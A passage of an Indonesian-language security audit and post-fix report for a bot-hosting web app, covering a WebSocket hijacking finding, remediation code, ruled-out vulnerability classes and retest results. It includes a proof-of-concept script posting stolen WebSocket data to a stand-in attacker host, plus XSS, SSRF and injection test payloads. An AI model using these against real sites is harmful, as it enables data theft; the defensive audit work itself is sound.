  const ws = new WebSocket('wss://api.skadesmart.web.id/ws');
  ws.onmessage = (e) => fetch('https://penyerang.example/curi', {
    method: 'POST', body: e.data
  });
</script>
```
Setiap pengunjung halaman itu akan **membocorkan seluruh riwayat chat global dan feed aktivitas** ke server penyerang. Ini juga membuka jalan untuk penyalahgunaan koneksi sebagai proksi.

- **Vulnerable Code:**
```ts
// src/lib/realtime.ts:226-227 — TANPA verifikasi Origin
export function attachRealtime(server: Server) {
  const wss = new WebSocketServer({ server, path: '/ws' });
```
```ts
// src/lib/realtime.ts:229-260 — data dikirim tanpa autentikasi
wss.on('connection', async (socket, req) => {
  const client: Client = { socket, claims: null, alive: true };
  try {
    const url = new URL(req.url ?? '/ws', 'http://localhost');
    const qToken = url.searchParams.get('token');
    if (qToken) client.claims = await verifyAccessToken(qToken);
  } catch { client.claims = null; }

  clients.add(client);
  broadcastPresence();

  // Snapshot awal — dikirim walau TIDAK ADA token
  const userId = client.claims?.sub ? Number(client.claims.sub) : undefined;
  const [chat, feed] = await Promise.all([
    recentGlobalMessages(50, userId),
    recentFeed(30, ['deposit', 'buy']),
  ]);
  socket.send(JSON.stringify({ type: 'init', chat, feed, ... }));   // <- bocor
```

**PERBAIKAN (siap produksi):**

```ts
// src/lib/realtime.ts — verifikasi Origin + wajib token untuk snapshot
import type { IncomingMessage } from 'node:http';

/** Origin yang diizinkan membuka WebSocket (samakan dengan CORS di server.ts). */
const WS_ALLOWED_ORIGINS = (
  process.env.CORS_ORIGINS ?? 'https://skadesmart.web.id,http://localhost:3000'
).split(',').map((o) => o.trim()).filter(Boolean);

/**
 * Tolak koneksi yang Origin-nya tidak dikenal (anti CSWSH).
 * Origin kosong = klien non-browser (mis. skrip uji) → ditolak juga,
 * kecuali koneksi dari loopback pada mode pengembangan.
 */
function originAllowed(req: IncomingMessage): boolean {
  const origin = req.headers.origin;
  if (!origin) {
    // Klien non-browser (curl/ws) tidak mengirim Origin. Izinkan hanya
    // dari loopback supaya skrip uji internal tetap jalan.
    const remote = req.socket.remoteAddress ?? '';
    return remote === '127.0.0.1' || remote === '::1' || remote === '::ffff:127.0.0.1';
  }
  return WS_ALLOWED_ORIGINS.includes(origin);
}

export function attachRealtime(server: Server) {
  const wss = new WebSocketServer({
    server,
    path: '/ws',
    // Lapis 1: tolak sebelum handshake selesai (paling efisien).
    verifyClient: (info, done) => {
      if (!originAllowed(info.req)) {
        console.warn('[ws] koneksi ditolak — Origin tidak diizinkan:', info.req.headers.origin);
        done(false, 403, 'Forbidden');
        return;
      }
      done(true);
    },
    // Batasi ukuran pesan masuk (anti DoS payload besar).
    maxPayload: 16 * 1024,
  });
```

```ts
// src/lib/realtime.ts — snapshot HANYA untuk koneksi terautentikasi
wss.on('connection', async (socket, req) => {
  // Lapis 2: periksa ulang Origin (jaga-jaga bila verifyClient di-bypass proxy).
  if (!originAllowed(req)) { socket.close(1008, 'Origin tidak diizinkan'); return; }

  const client: Client = { socket, claims: null, alive: true };
  try {
    const url = new URL(req.url ?? '/ws', 'http://localhost');
    const qToken = url.searchParams.get('token');
    if (qToken) {
      const claims = await verifyAccessToken(qToken);
      // Hormati pemblokiran akun (samakan dengan requireAuth).
      const u = await db.get<{ is_banned: number }>(
        'SELECT is_banned FROM users WHERE id = ?', [Number(claims.sub)]
      );
      if (u && !u.is_banned) client.claims = claims;
    }
  } catch { client.claims = null; }

  clients.add(client);
  broadcastPresence();

  if (!client.claims) {
    // Anonim: JANGAN kirim snapshot apa pun. Klien harus mengirim
    // { type:'auth', token } dulu; kalau tidak, koneksi ditutup.
    socket.send(JSON.stringify({
      type: 'need-auth',
      error: 'Koneksi tanpa autentikasi tidak menerima data. Kirim { type: "auth", token }.',
    }));
    const timer = setTimeout(() => {
      if (!client.claims) { try { socket.close(1008, 'Belum autentikasi'); } catch { /* abaikan */ } }
    }, 10_000);
    socket.once('close', () => clearTimeout(timer));
    return;
  }

  // Baru kirim snapshot setelah terautentikasi
  const userId = Number(client.claims.sub);
  const [chat, feed] = await Promise.all([
    recentGlobalMessages(50, userId),
    recentFeed(30, ['deposit', 'buy']),
  ]);
  socket.send(JSON.stringify({ type: 'init', chat, feed, me: { ... } }));
  // ...sisanya sama
```

> **Catatan integrasi:** menutup akses anonim ke `/ws` berarti frontend **wajib** mengirim token saat handshake. Di `web/lib/realtime.ts` tambahkan token ke URL koneksi:
> ```ts
> // web/lib/realtime.ts
> const t = getAccessToken();
> const ws = new WebSocket(`${WS_URL}/ws?token=${encodeURIComponent(t ?? '')}`);
> ```
> Pastikan juga `CORS_ORIGINS` di `.env` sudah memuat domain produksi **dan** `http://localhost:3000` untuk pengembangan.

---

## KERENTANAN YANG TERBUKTI TIDAK ADA (12 kelas)

Bagian ini penting agar tidak ada kesan audit yang tidak lengkap.

| # | Kelas | Alasan N/A | Dasar |
|---|---|---|---|
| 1 | SQL Injection | Semua query parameterized (`?`), interpolasi hanya dari generator placeholder | `src/db/index.ts:58-61`; ~58 titik query diperiksa |
| 8 | Insecure Deserialization | `JSON.parse` hanya pada data sendiri, dibungkus `try/catch`, tanpa pemetaan ke konstruktor | `src/lib/realtime.ts:70`, `src/lib/qris.ts:48-52` |
| 9 | XXE | Tidak ada parser XML sama sekali | Pencarian `xml2js`/`fast-xml-parser`/`libxmljs`/`xmldom`/`sax` → 0 hasil |
| 11 | Mass Assignment | zod *strip* properti tak dikenal; INSERT per kolom eksplisit | Terbukti: `role:"admin"`,`balance:999999999` ditolak (`role=user, balance=0`) |
| 13 | Prototype Pollution | Tidak ada deep-merge buatan sendiri; `JSON.parse` tidak menyentuh `__proto__` | Terbukti: payload `__proto__` tidak mencemari server |
| 14 | SSTI | Tidak ada template engine, tidak ada `res.render()` | Pencarian `ejs`/`pug`/`handlebars`/`nunjucks` → 0 hasil nyata |
| 15 | Dynamic Code Execution | Tidak ada `eval`/`new Function`/`vm`/`child_process` | Pencarian → 0 hasil |
| 16 | HTTP Cache Poisoning | API tidak mengirim header cache sama sekali | Pencarian `cache-control`/`surrogate`/`vary` di `src/` → 0 |
| 18 | HTTP Request Smuggling | Node llhttp menolak framing ambigu; Cloudflare menormalkan header | Uji `Transfer-Encoding: chunked` → 401 (normal) |
| 20 | GraphQL | Tidak memakai GraphQL sama sekali | Tidak ada `graphql`/`apollo` di `package.json` |
| 19 | CRLF / Header Injection | Tidak ada input user yang ditulis ke header respons | Uji `%0d%0aX-Injected` → header tidak muncul |
| 12* | *(Race condition — ada, lihat #12)* | — | — |

---

## HIGHLIGHT: YANG SUDAH BAIK (jangan diubah)

Beberapa bagian sudah menerapkan praktik keamanan yang benar dan sering terlewat:

- **bcrypt cost 12** (`src/lib/auth.ts:50`) + **dummy hash** untuk mencegah *user enumeration* lewat timing (`src/routes/auth.ts:141-142`)
- **Refresh token disimpan sebagai SHA-256 hash** (`src/lib/auth.ts:102-104`) + **rotasi anti-replay** (`src/lib/auth.ts:124-125`)
- **JWT `alg` dipatok eksplisit** + `iss`/`aud` diverifikasi + startup menolak secret < 32 karakter (`src/lib/auth.ts:9-11,82,92`)
- **Cookie refresh** `httpOnly` + `secure` + `sameSite: lax` (`src/routes/auth.ts:19-25`)
- **Transaksi DB** untuk semua operasi uang (`src/routes/bots.ts:187`, `src/lib/qris.ts:230`)
- **Feed disiarkan setelah commit** — mencegah aktivitas hantu dari transaksi yang gagal (`src/lib/qris.ts:261-272`)
- **Upload tanpa menyentuh disk** + magic bytes + pematokan domain hasil (`src/lib/catbox.ts:62,88,104-120`)
- **`.gitignore` lengkap** (`.env`, `data/*.db*`, `node_modules/`, `dist/`, `.next/`) — tidak ada rahasia ter-*commit*
- **Rate limit login & chat ada** (meski perlu diperkuat, lihat #2)
- **`trust proxy`** dikonfigurasi sehingga `req.ip` memakai IP asli, bukan `127.0.0.1` (`src/server.ts:19`)

---

## RENCANA PERBAIKAN BERURUTAN

**Segera (hari ini) — risiko aktif:**
1. `chmod 600 .env` (#6b) — satu perintah, dampak besar
2. **SSRF**: terapkan `src/lib/ssrf.ts` + validasi di `bots.ts` POST/PATCH/connect (#7) — **terbukti dapat dieksploitasi**
3. **Broken Access Control**: `assertBotOwner()` di seluruh `/api/bot/:name/*` (#5a) — **terbukti dapat dieksploitasi**
4. **CSWSH**: `verifyClient` + wajib token untuk snapshot (#25) — **terbukti**

**Minggu ini — uang & data:**
5. **Race condition**: `SELECT ... FOR UPDATE` + `UPDATE ... WHERE` atomik (#12)
6. **Dependency**: `npm audit fix` + `overrides` untuk `tar`/`qs`/`uuid` (#23)
7. **Rate limit**: pindah ke MySQL (`rate_limits`) + `INTERNAL_SECRET` (#2b, #2c)
8. **XSS**: `sanitizeText()` di `src/lib/realtime.ts` (#3)
9. **Open redirect**: `safeNext()` di `web/app/login/page.tsx` (#17)

**Bulan ini — pengerasan:**
10. **CSP** + header keamanan di `web/next.config.mjs` (#6a, #6c)
11. **Upload**: MIME dari magic bytes + rate limit (#22)
12. **`requireAdmin`** verifikasi ke DB (#21)
13. **Access token ke cookie httpOnly** (#24)
14. **`optionalAuth`** ikut cek `is_banned` (#5b)
15. Batasi `/api/logs` ke bot milik sendiri (#10)

**Setelah setiap perbaikan:** jalankan `npx tsc --noEmit`, `npm run build` (backend & frontend), `pm2 restart afk-api`, lalu uji ulang endpoint terkait. Untuk perubahan pada `bedrock-protocol`/`minecraft-data`, **wajib uji koneksi bot** ke `be.prownetwork.net:19132`.

---

*Akhir laporan. Seluruh pengujian dilakukan pada instance milikmu sendiri dengan izin penuh; tidak ada sistem pihak ketiga yang disentuh. Data uji sudah dibersihkan.*

---

# CATATAN PASCA-PERBAIKAN (2026-09-15)

Seluruh 13 temuan sudah **diterapkan dan diuji ulang dengan serangan sungguhan**.
Bagian ini mencatat hasil uji, plus satu kesalahan penerapan yang hampir fatal
supaya tidak terulang.

## Ringkasan hasil uji

| # | Temuan | Cara uji | Hasil |
|---|--------|----------|-------|
| 7 | SSRF | Daftarkan bot dgn host `169.254.169.254`, `127.0.0.1`, `10.0.0.1`, `metadata.google.internal` | Semua **ditolak** |
| 5a | Broken Access Control | Akun lain panggil 8 endpoint `/api/bot/:name/*` milik orang | Semua **404**; bot korban tetap hidup (`spawned`, health 20) |
| 25 | CSWSH | WS dgn `Origin: https://evil.example` | **HTTP 403** |
| 25 | Snapshot tanpa token | WS tanpa `?token=` | **`need-auth`, nol data** (bukan hanya UI kosong) |
| 12 | Race condition saldo | 8 request sewa `harian` **bersamaan** | 8 sukses, potong **Rp24.000** (8 x 3.000 **tepat**), `expires_at` **+8 hari** |
| 2a | Brute force login | 12 percobaan salah berturut-turut | Lockout **429 di percobaan ke-11** |
| 2b | Rate limit persisten | Cek tabel `rate_limits` setelah request | Terisi di DB (bertahan melewati restart PM2) |
| 3 | Stored XSS | Kirim `<img src=x onerror=alert(1)>` & `<b>halo</b>` | `onerror` **hilang**; `<b>` jadi teks polos |
| 22 | Upload MIME | PNG dgn header `Content-Type: text/html` | Terdeteksi **`.png`** dari magic bytes; header klien diabaikan |
| 22 | Upload palsu | File non-gambar ber-header `image/png` | **Ditolak** |
| 22 | Rate limit upload | Berulang kali upload | **429** setelah kuota |
| 6 | Header keamanan | `curl -I` halaman | CSP, HSTS, nosniff, X-Frame-Options, Referrer-Policy, Permissions-Policy **semua ada**; `x-powered-by` **hilang** |
| 6 | Cache data pribadi | `curl -I /dashboard` | `private, no-store, max-age=0` |
| 23 | Dependensi | `npm audit --omit=dev` | **12 -> 0 kerentanan** |
| 17 | Open redirect | Kode `safeNext()` di halaman login | `?next=https://...` **dinormalisasi** ke `/dashboard` |
| 10 | `/api/logs` | Bot milik user lain | **Terbatas** ke bot milik sendiri |

## KESALAHAN PENERAPAN YANG WAJIB DIINGAT

**Gejala:** setelah CSP dipasang, login **tidak bisa sama sekali**. Console
browser menunjukkan `Fetch API cannot load https://api.skadesmart.web.id/api/auth/login.
Refused to connect because it violates the document's Content Security Policy.`

**Sebab:** CSP di `web/next.config.mjs` memakai nilai default sendiri
(`http://localhost:3738`) untuk `connect-src`, sedangkan kode frontend
(`web/lib/api.ts`, `web/lib/realtime.ts`) memanggil **domain lain** —
`https://api.skadesmart.web.id`. Dua sumber konfigurasi yang berbeda:

```
next.config.mjs  -> API = process.env.API_URL ?? 'http://localhost:3738'   (port salah: backend di 3737)
web/lib/api.ts   -> API_URL = process.env.NEXT_PUBLIC_API_URL ?? 'https://api.skadesmart.web.id'
```

Akibatnya CSP yang terkirim hanya mengizinkan `localhost:3738`:

```
connect-src 'self' http://localhost:3738 ws://localhost:3738
```

...sehingga **setiap** panggilan API diblokir browser sebelum keluar.

**Perbaikan:** kedua berkas sekarang memakai variabel **yang sama**
(`NEXT_PUBLIC_API_URL`), dengan default yang benar
(`https://api.skadesmart.web.id`). CSP dan kode aplikasi tidak bisa lagi
berbeda pendapat.

**Pelajaran:** CSP `connect-src` harus diturunkan dari **URL yang benar-benar
dipanggil kode**, bukan diketik ulang. Kalau menambah origin baru di kode
(mis. layanan pihak ketiga), CSP **wajib** ikut diperbarui, jika tidak fitur
akan mati tanpa pesan yang jelas di sisi server.

**Origin yang kini diizinkan, beserta alasannya:**

| Origin | Direktif | Alasan |
|--------|----------|--------|
| `https://api.skadesmart.web.id` | `connect-src`, `form-action` | Backend API (semua fetch) |
| `wss://api.skadesmart.web.id` | `connect-src` | WebSocket chat & feed realtime |
| `https://static.cloudflareinsights.com`, `https://cloudflareinsights.com` | `script-src` | Beacon analitik yang **disuntik Cloudflare**, bukan kode kita |
| `https://challenges.cloudflare.com` | `script-src`, `frame-src` | Widget Turnstile (kalau nanti diaktifkan) |
| `https://files.catbox.moe` | `img-src` | Penyimpanan foto profil |

**Catatan `'unsafe-inline'` pada `script-src`:** masih diperlukan karena
Next.js menyuntik script inline untuk hydration
(`<script>self.__next_f.push([...])</script>`) — diverifikasi ada di HTML
halaman login. Untuk menghapusnya perlu migrasi ke **nonce berbasis
middleware** (`next.config.mjs` tidak bisa membuat nonce per-request karena
header dievaluasi statis). Ini pengerasan lanjutan yang belum dikerjakan.

## PROSEDUR OPERASIONAL — JANGAN SAMPAI SALAH

**KRITIS: jangan pernah `pkill -f "next-server"` atau `pkill -f "next start"`.**

Di mesin ini ada **dua** proses Next.js:

| Proses | Port | PID (contoh) | Boleh dimatikan? |
|--------|------|--------------|------------------|
| IsanC (web sendiri) | 3000 | 64853 | Ya |
| **9router** (milik orang lain) | **20128** | 64402 | **TIDAK PERNAH** |

Pola `pkill -f "next-server"` cocok dengan **keduanya** dan sudah pernah
mematikan 9router tanpa sengaja.

**Cara restart web yang benar:**

```bash
# 1. Cari PID yang mendengarkan port 3000 SAJA
PID=$(ss -tlnp | grep ":3000 " | grep -oE "pid=[0-9]+" | head -1 | cut -d= -f2)

# 2. Matikan hanya PID itu
kill "$PID"

# 3. Pastikan 9router masih hidup
ss -tlnp | grep -q ":20128 " && echo "9router aman" || echo "PERINGATAN"

# 4. Start ulang
cd ~/Documents/afk-bedrock/web && npm start
```

**Aturan lain:**
- Wajib `npm run build` di `web/` setiap kali mengubah `next.config.mjs` —
  header & rewrites dibaca saat build, bukan saat runtime.
- `npm install` **tidak** mengubah proses yang sedang jalan; restart tetap perlu.
- Tunnel mati (HTTP 530) → `pm2 start cloudflared --name afk-tunnel -- tunnel
  --config ~/.cloudflared/config.yml run`, lalu `pm2 save`.
